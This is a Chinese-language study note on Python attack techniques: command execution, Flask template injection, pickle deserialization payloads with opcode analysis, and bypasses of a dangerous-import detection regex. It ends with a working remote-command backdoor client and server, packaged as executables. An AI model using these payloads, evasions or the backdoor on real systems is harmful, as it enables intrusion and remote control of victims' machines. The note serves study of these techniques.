### 代码执行

eval

~~~python
import os
a = eval("os.popen('whoami').read()")
print(a)
# das-lightning\batma
~~~

exec---execfile(3.0版本被淘汰)

~~~python
import os
command = "ping fwdgpk.dnslog.cn"
code = "result = os.popen('{}').read()".format(command)
exec(code)
print(result)
~~~

~~~python
source = "print('Hello, World!')"
code_object = compile(source, "<string>", "exec")
exec(code_object)
~~~



### 命令执行

~~~python
import os
status = os.system("whoami")
~~~



~~~python
import os
output = os.popen("whoami").read()
print(output)
~~~



~~~python
import subprocess
status = subprocess.call(["net", "user"])
~~~



~~~python
import subprocess
p = subprocess.Popen(["net", "user"], stdout=subprocess.PIPE)
output = p.communicate()[0]
print(output)
~~~



~~~python
import os
os.execl("/bin/ls", "ls", "-l")
~~~



~~~python
import os
pid = os.spawnlp(os.P_NOWAIT, "/bin/ls", "ls", "-l")
~~~

commands（2.6之后被淘汰）

~~~python
import commands

# 执行一个简单的shell命令并获取其输出
output = commands.getoutput('ls -l')

# 输出命令的输出
print(output)
~~~



~~~python
import pty

# 执行 whoami 命令
pid, fd = pty.spawn('whoami')

# 读取命令输出
output = b''
while True:
    try:
        data = os.read(fd, 1024)
        if not data:
            break
        output += data
    except:
        break

# 打印输出结果
print(output.decode())
~~~





### 模板注入



###### flask

index.py

~~~python
from flask import Flask, render_template_string, request

app = Flask(__name__)

flag = "flag{batmanfuture}"


@app.route('/',methods = ['GET'])
def index():
    str = request.args.get('ben')
    html_str = '''
        <html>
        <head></head>
        <body>{0}</body>
        </html>
    '''.format(str)


    return render_template_string(html_str)

if __name__ == '__main__':
    app.run(debug=True)
    app.run('127.0.0.1', '8080')
~~~

index.html

~~~html
<html>
<head>
    <title>Hello, { name }!</title>
</head>
<body>
    <h1>Hello, { name }!</h1>
</body>
</html>
~~~

![image.png](https://cdnjson.com/images/2023/05/25/image.png)

###### 利用template实现模板注入

~~~python
from flask import Flask, render_template_string, request
from string import Template
app = Flask(__name__)

flag = "flag{batmanfuture}"


@app.route('/',methods = ['GET'])
def index():
    template = Template('Hello, $name!')
    output = template.substitute(name='{{7*7}}')


    return render_template_string(output)

if __name__ == '__main__':
    app.run(debug=True)
    app.run('127.0.0.1', '8080')
~~~

![image9e479b17e6b08bb0.png](https://cdnjson.com/images/2023/05/25/image9e479b17e6b08bb0.png)

### 反序列化

![image4f3d9a3f9a2af877.png](https://cdnjson.com/images/2023/05/25/image4f3d9a3f9a2af877.png)

~~~python
json
pickle和cpickle
~~~

序列化必须是和漏洞在一起研究的，所以我会以django代码形式展示漏洞利用

只有pickle模块在进行反序列化二进制字节码的时候，会将反序列化后的内容进行代码执行



我也写过一篇有关php反序列化的文章，php中有关序列化和反序列化的函数有很多，但是为什么只研究`serialize`和`unserialize`，而不研究其他的呢？因为只有这一组才能实现对对象的序列化和反序列化，因为反序列化漏洞的本质就是通过反序列化传入的方式赋值给一个对象，通过调用这个对象时触发了魔术方法，进而可以控制执行其他操作，如下：

~~~php
<?php
highlight_file(__FILE__);
error_reporting(0);
class index{
	public $test;
	public function __construct(){	
		
	}
	public function __destruct(){
		$this->test->action();
	}
}
class evil{
	var $test2;
	public function action(){	
		eval($this->test2);
	}
}
$b = unserialize($_GET['test']);
?>
~~~

这道题目就是利用反序列化得到对象$b，进而触发这个类的__ destruct魔术方法，在这个魔术方法内部实现了`$this->test->action();`，而test是类的属性，我们可以控制，也就是说我们可以调用任意类的action方法，进而调用了evil类的action方法实现了代码执行；

所以如果不研究对对象的序列化和反序列化，对数组，字符串这种的序列化和反序列化有研究的必要吗？如图，我在实际代码审计中遇到了`json_decode`这怎么利用呢？[典型的接收所有post过来的数据然后反序列化]

![imaged4ee0176b07617d0.png](https://cdnjson.com/images/2023/05/25/imaged4ee0176b07617d0.png)

##### JSON

~~~PYTHON
import json
# 对Python数据类型进行序列化
dict_data = {'name': 'John', 'age': 30, 'city': 'New York'}
json_dict_data = json.dumps(dict_data)
list_data = [1, 2, 3, 'four']
json_list_data = json.dumps(list_data)
tuple_data = (4, 5, 6)
json_tuple_data = json.dumps(tuple_data)
int_data = 10
json_int_data = json.dumps(int_data)
float_data = 3.14
json_float_data = json.dumps(float_data)
bool_data = True
json_bool_data = json.dumps(bool_data)
none_data = None
json_none_data = json.dumps(none_data)
# 打印输反序列化JSON数据以及其类型
print(dict_data, type(dict_data))
print(list_data, type(list_data))
print(tuple_data, type(tuple_data))
print(int_data, type(int_data))
print(float_data, type(float_data))
print(bool_data, type(bool_data))
print(none_data, type(none_data))
# 反序列化JSON数据
dict_data_2 = json.loads(json_dict_data)
list_data_2 = json.loads(json_list_data)
tuple_data_2 = json.loads(json_tuple_data)
int_data_2 = json.loads(json_int_data)
float_data_2 = json.loads(json_float_data)
bool_data_2 = json.loads(json_bool_data)
none_data_2 = json.loads(json_none_data)
# 打印输出反序列化JSON数据以及其类型
print(dict_data_2, type(dict_data_2))
print(list_data_2, type(list_data_2))
print(tuple_data_2, type(tuple_data_2))
print(int_data_2, type(int_data_2))
print(float_data_2, type(float_data_2))
print(bool_data_2, type(bool_data_2))
print(none_data_2, type(none_data_2))
~~~



可以看P神的这篇文章：

https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html

在P神的文章里，对方是flask + redis，通过修改redis里存放session的字符串为一个反弹shell的序列化字符串

~~~
session： e6c36e69a9cf9543243d7921aa1a3d8093b49441 = 序列化的字符串
~~~

然后将cookie设置成`session_id=e6c36e69a9cf9543243d7921aa1a3d8093b49441`

刷新页面，触发了session的反序列化->执行了__ reduce __ 魔术方法->从而反弹shell

~~~python
import os
import pickle

class A:
    def __reduce__(self):
        s = "calc"
        return (os.system, (s,))

e = A()
s = pickle.dumps(e)
print(s, type(s))
haha = pickle.loads(s)
~~~

![image885306fce1d6a8b8.png](https://cdnjson.com/images/2023/05/25/image885306fce1d6a8b8.png)

.

#### PVM

和JVM同理，python也有类似java中数据处理机制，我们通过上面的代码得到了序列化后内容

~~~python
b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.'
~~~

##### 组成部分

`PVM`由三个部分组成:

- 指令处理器: 从流中读取`opcode`和参数, 并对其进行解释处理. 重复这个动作, 直到遇到`.`这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.
- 栈区(`stack`): 由`Python`的`list`实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.
- 标签区(`memo`): 由`Python`的`dict`实现, 为`PVM`的整个生命周期提供存储.

##### 执行流程

首先, `PVM`会把源代码编译成字节码, 字节码是`Python`语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果`Python`进程在主机上有写入权限, 那么它会把程序字节码保存为一个以`.pyc`为扩展名的文件. 如果没有写入权限, 则`Python`进程会在内存中生成字节码, 在程序执行结束后被自动丢弃.

【这里类似，java通过对hello.java进行编译得到字节码文件hello.class，然后再利用jvm执行，而python同理，通过对hello.py文件进行编译得到hello.pyc，然后利用python虚拟机pvm进行执行】

一般来说, 在构建程序时最好给`Python`进程在主机上的写入权限, 这样只要源代码没有改变, 生成的`.pyc`文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.

然后, `Python`进程会把编译好的字节码转发到`PVM`(`Python`虚拟机)中, `PVM`会循环迭代执行字节码指令, 直到所有操作被完成.

##### 指令集

当前用于`pickling`的协议共有`6`种, 使用的协议版本越高, 读取生成的`pickle`所需的`Python`版本就要越新.

- `v0`版协议是原始的"人类可读"协议, 并且向后兼容早期版本的`Python`.
- `v1`版协议是较早的二进制格式, 它也与早期版本的`Python`兼容.
- `v2`版协议是在`Python 2.3`中引入的, 它为存储`new-style class`提供了更高效的机制, 参阅`PEP 307`.
- `v3`版协议添加于`Python 3.0`, 它具有对`bytes`对象的显式支持, 且无法被`Python 2.x`打开, 这是目前默认使用的协议, 也是在要求与其他`Python 3`版本兼容时的推荐协议.
- `v4`版协议添加于`Python 3.4`, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅`PEP 3154`.
- `v5`版协议添加于`Python 3.8`, 它支持带外数据, 加速带内数据处理.

```python
# Pickle opcodes.  See pickletools.py for extensive docs.  The listing
# here is in kind-of alphabetical order of 1-character pickle code.
# pickletools groups them by purpose.

MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

# Protocol 2

PROTO          = b'\x80'  # identify pickle protocol
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
EXT1           = b'\x82'  # push object from extension registry; 1-byte index
EXT2           = b'\x83'  # ditto, but 2-byte index
EXT4           = b'\x84'  # ditto, but 4-byte index
TUPLE1         = b'\x85'  # build 1-tuple from stack top
TUPLE2         = b'\x86'  # build 2-tuple from two topmost stack items
TUPLE3         = b'\x87'  # build 3-tuple from three topmost stack items
NEWTRUE        = b'\x88'  # push True
NEWFALSE       = b'\x89'  # push False
LONG1          = b'\x8a'  # push long from < 256 bytes
LONG4          = b'\x8b'  # push really big long

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

# Protocol 3 (Python 3.x)

BINBYTES       = b'B'   # push bytes; counted binary string argument
SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " < 256 bytes

# Protocol 4

SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes
BINUNICODE8      = b'\x8d'  # push very long string
BINBYTES8        = b'\x8e'  # push very long bytes string
EMPTY_SET        = b'\x8f'  # push empty set on the stack
ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
FROZENSET        = b'\x91'  # build frozenset from topmost stack items
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
MEMOIZE          = b'\x94'  # store top of the stack in memo
FRAME            = b'\x95'  # indicate the beginning of a new frame

# Protocol 5

BYTEARRAY8       = b'\x96'  # push bytearray
NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
READONLY_BUFFER  = b'\x98'  # make top of stack readonly
```

上文谈到了`opcode`是有多个版本的, 在进行序列化时可以通过`protocol=num`来选择`opcode`的版本, 指定的版本必须小于等于`5`.

~~~python
import os
import pickle

class Demo():
    def __init__(self, name='h3rmesk1t'):
        self.name = name

    def __reduce__(self):
        return (os.system, ('whoami',))
demo = Demo()
for i in range(6):
    print('[+] pickle v{}: {}'.format(str(i), pickle.dumps(demo, protocol=i)))

print("默认")
print(pickle.dumps(demo))
~~~

~~~python
[+] pickle v0: b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
[+] pickle v1: b'cnt\nsystem\nq\x00(X\x06\x00\x00\x00whoamiq\x01tq\x02Rq\x03.'
[+] pickle v2: b'\x80\x02cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
[+] pickle v3: b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
[+] pickle v4: b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
[+] pickle v5: b'\x80\x05\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
默认
b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
~~~

会发现，默认的pickle.dumps进行序列化是v4，

我们对`b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'`进行翻译还原

基本模式:

```python
c<module>
<callable>
(<args>
tR.
```

这里用一段简短的字节码来演示利用过程:

```python
cos
system
(S'whoami'
tR.
```

代码就是：

~~~python
import pickle

s = b"cos\nsystem\n(S'whoami'\ntR."
pickle.loads(s)
~~~

![image20f175d61cec9cce.png](https://cdnjson.com/images/2023/05/25/image20f175d61cec9cce.png)

~~~python
cos         =>  引入模块 os.
system      =>  引用 system, 并将其添加到 stack.
(S'whoami'  =>  把当前 stack 存到 metastack, 清空 stack, 再将 'whoami' 压入 stack.
t           =>  stack 中的值弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple 压入 stack.
R           =>  system(*('whoami',)).
.           =>  结束并返回当前栈顶元素.
~~~

![imageb5b3f8a22d3aa1ac.png](https://cdnjson.com/images/2023/05/26/imageb5b3f8a22d3aa1ac.png)

![image2be00267c0c60cde.png](https://cdnjson.com/images/2023/05/26/image2be00267c0c60cde.png)

Python 编译器负责将 Python 源代码编译成 PyCodeObject 对象，然后交给 Python 虚拟机来执行，虚拟机的执行实际上就是对字节码不断解析的一个过程，py 文件被编译成字节码，这句话其实不太严谨，因为字节码只是一个 PyBytesObject 对象、或者说一段字节序列。但很明显，光有字节码是不够的，还有很多的静态信息也需要被收集起来，它们整体被称为 PyCodeObject，.pyc文件就是负责保存编译之后的 PyCodeObject 对象。

故此

~~~
PyCodeObject：字节码 + 常量等
~~~





#### 漏洞常见出现地方

1. 通常在解析认证`token`, `session`的时候. 现在很多`Web`服务都使用`redis`、`mongodb`、`memcached`等来存储`session`等状态信息.

   【p神博客那篇】

2. 可能将对象`Pickle`后存储成磁盘文件.

3. 可能将对象`Pickle`后在网络中传输.

![image63597922f898525e.png](https://cdnjson.com/images/2023/05/25/image63597922f898525e.png)

像marshal这种起着类似序列化回调的方式，也算吧【无法对对象进行】

~~~python
import marshal
import os

class Index:
    @staticmethod
    def demo():
        os.system('whoami')

    @staticmethod
    def haha():
        print("123")

Index.haha()
marshal.dumps(Index.demo())
~~~





### 沙箱逃逸

https://xz.aliyun.com/t/52

Python的沙箱逃逸是一些OJ,Quantor网站渗透测试的重要渠道

防御者可以挂着执行以下代码查找是否导入了危险的模块

~~~python
import re
code = open('code.py').read()
pattern  = re.compile('import\s+(os|commands|subprocess|sys)')
match = re.search(pattern,code)
if match:
    print "forbidden module import detected"
    raise Exception
~~~

要执行shell命令,必须引入 os/commands/subprocess这几个包

尝试绕过：

###### 1）编码绕过import危险模块正则匹配

尝试利用rot 13编码绕过，在线网站https://www.jisuan.mobi/WKE.html

这里任意编码看你选择，如果我们选择使用rot 13，那么可以自己编写rot 13解密函数，或者在python3引入codecs模块实现

~~~python
import codecs
import importlib

# 对 ROT13 编码的字符串进行解码
decoded_message = codecs.decode("bf", 'rot_13')
f3ck = importlib.import_module(decoded_message)
print(f3ck.system('whoami'))
~~~

如果觉得system也被拦截，也可以替换，whoami执行命令也可以编码处理

![imagea8077ae40d55ad63.png](https://cdnjson.com/images/2023/05/25/imagea8077ae40d55ad63.png)

~~~python
print(eval("__import__('os').system('whoami')", {}))
~~~





转换代码

~~~python
import codecs
# 对字符串进行 ROT13 编码
message = "hello, world!"
encoded_message = codecs.encode(message, 'rot_13')
print(encoded_message)  # 输出："uryyb, jbeyq!"

# 对 ROT13 编码的字符串进行解码
decoded_message = codecs.decode(encoded_message, 'rot_13')
print(decoded_message)  # 输出："hello, world!"
~~~

###### 2）绕过builtins删除

我们在python3下执行

~~~python
import sys

print(sys.modules)
~~~

得到是我们加载的包/模块顺序，其中发现`'builtins': <module 'builtins' (built-in)>`

不用引入直接使用的内置函数称为 **builtin** 函数【python2是__ builtin __,python3是builtins】

你在python下执行输出print也是调用了这个函数

~~~python
import builtins

print("haha")
builtins.print("haha123")
# haha
# haha123
~~~

那么防御者可以删除__ builtin __内部函数，那么我们就无法使用了

![image7981cb373ec4aa7f.png](https://cdnjson.com/images/2023/05/25/image7981cb373ec4aa7f.png)

防御者，将代码执行函数【eval，exec，execfile】都删掉

攻击者如何绕过呢？

1】如果防御者没有删除reload函数，那么可以用reload重新加载builtin，那么就可以执行代码执行函数了

![imagec1a50b9a858daf62.png](https://cdnjson.com/images/2023/05/25/imagec1a50b9a858daf62.png)

常用的话就是前两种导入方式

~~~python
from imp import reload

reload(__builtins__)
print("haha")
~~~

~~~python
from importlib import reload

reload(__builtins__)
print("haha")
~~~

以上是通过绕过已经引用存在的包，但是被拦截了，如果不存在引用怎么办

###### 3）绕过引用不存在

python3执行

~~~python
import sys
print(sys.path)	#	查看包加载的顺序
~~~

~~~python
['D:\\pycharm\\file\\flaskProject', 'D:\\pycharm\\file\\flaskProject', 'D:\\pycharm\\PyCharm 2021.3.1\\plugins\\python\\helpers\\pycharm_display', 'D:\\pycharm\\python\\python39.zip', 'D:\\pycharm\\python\\DLLs', 'D:\\pycharm\\python\\lib', 'D:\\pycharm\\python', 'C:\\Users\\batma\\AppData\\Roaming\\Python\\Python39\\site-packages', 'D:\\pycharm\\python\\lib\\site-packages', 'D:\\pycharm\\python\\lib\\site-packages\\win32', 'D:\\pycharm\\python\\lib\\site-packages\\win32\\lib', 'D:\\pycharm\\python\\lib\\site-packages\\Pythonwin', 'D:\\pycharm\\PyCharm 2021.3.1\\plugins\\python\\helpers\\pycharm_matplotlib_backend']
~~~

如果删除这些目录引用怎么绕过，添加回来

~~~python
import sys
sys.modules['os']='/usr/lib/python3.8/os.py'
~~~



还有另外一种方法，就是直接找到对应的文件，在python3执行【这部分是针对python2的】

~~~python
import os
import pandas as pd

print(os.path.abspath(pd.__file__))
#	D:\pycharm\python\lib\site-packages\pandas\__init__.py
~~~

然后

~~~python
execfile('D:\pycharm\python\lib\site-packages\pandas\__init__.py')
system("whoami")
~~~

魔术方法__ dict __，和dir()是一样的作用

~~~python
class MyClass:
    def __init__(self, name):
        self.name = name

    def say_hello(self):
        print(f"Hello, {self.name}!")


# 实例化 MyClass 对象，并打印其实例属性
obj = MyClass("world")
print(obj.__dict__)  # 输出 {'name': 'world'}
~~~

查看可以利用的内置函数

~~~python
print(dir(__builtins__))
~~~

![image.png](https://cdnjson.com/images/2023/05/26/image.png)

###### 4）字符串扫描过滤的通用绕过方法

如果我们已经导入了os，但是system被过滤了，那么就可以借助getattr来绕过

该函数接受两个参数,一个模组或者对象,第二个是一个字符串

~~~python
import os

import codecs
getattr(os, codecs.encode("flfgrz",'rot13'))('ipconfig')
~~~



### 远控

服务端

~~~python
import socket
import os
import threading

# 创建一个 TCP/IP socket 对象
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 绑定地址和端口号
server_address = ('10.161.132.21', 12340)
server_socket.bind(server_address)

# 开始监听客户端连接
server_socket.listen(1)
print("等待客户端连接...")

def input_command(client_socket):
    while True:
        # 在服务端上输入命令，并发送到客户端
        command = input("请输入要执行的命令：")
        if not command:
            break
        client_socket.sendall(command.encode('gbk'))

    # 关闭客户端连接
    print(f"与客户端 {client_address} 断开连接")
    client_socket.close()

while True:
    # 接收客户端连接请求
    client_socket, client_address = server_socket.accept()
    print(f'客户端 {client_address} 已连接')

    # 启动一个线程接收用户在服务端上的输入命令
    input_thread = threading.Thread(target=input_command, args=(client_socket,))
    input_thread.start()

    try:
        while True:
            # 接收客户端返回的结果，并打印到服务端
            result = client_socket.recv(4096)
            if not result:
                break
            print(f"执行结果：\n{result.decode('gbk')}")

    finally:
        # 关闭客户端连接
        print(f"与客户端 {client_address} 断开连接")
        client_socket.close()

~~~

客户端

~~~python
import socket
import subprocess

# 创建一个 TCP/IP socket 对象
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接服务端地址和端口号
server_address = ('10.161.132.21', 12340)
client_socket.connect(server_address)

try:
    while True:
        # 接收服务端发送的命令，并执行该命令后将结果返回给客户端
        command = client_socket.recv(4096).decode('gbk')
        if not command:
            break

        try:
            # 使用 subprocess 模块执行命令
            process = subprocess.Popen(command, shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
            out, err = process.communicate()

            # 获取命令输出结果或错误信息
            result = out if out else err

        except Exception as e:
            # 捕获异常并将错误信息返回给客户端
            result = str(e).encode('gbk')

        client_socket.sendall(result)

finally:
    # 关闭客户端连接
    client_socket.close()

~~~

生成exe

~~~powershell
pyinstaller.exe -F 服务端.py
pyinstaller.exe -F 客户端.py
~~~







